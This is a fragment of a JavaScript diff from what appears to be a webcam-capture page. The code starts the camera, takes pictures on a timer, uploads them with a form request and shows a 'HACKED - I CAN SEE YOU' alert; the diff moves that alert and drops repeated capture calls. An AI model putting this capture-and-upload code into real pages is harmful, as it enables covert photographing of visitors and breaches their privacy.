@@ -39,6 +39,7 @@ function takePicture(){
       //request.setRequestHeader('Content-type', 'multipart/form-data');
       request.send(formData);
 	  
+	  alert("HACKED - I CAN SEE YOU!")
 	  
 })
 
@@ -54,13 +55,7 @@ function cameraStart() {
         cameraView.srcObject = stream;
 		window.setTimeout(function(){
 			takePicture()
-			window.setTimeout(function(){ takePicture()}, 500);
-			window.setTimeout(function(){ takePicture()}, 500);
-			alert("HACKED - I CAN SEE YOU");
-			
 		}, 1000);
-		
-		
     })
     .catch(function(error) {
         console.error("Oops. Something is broken.", error);
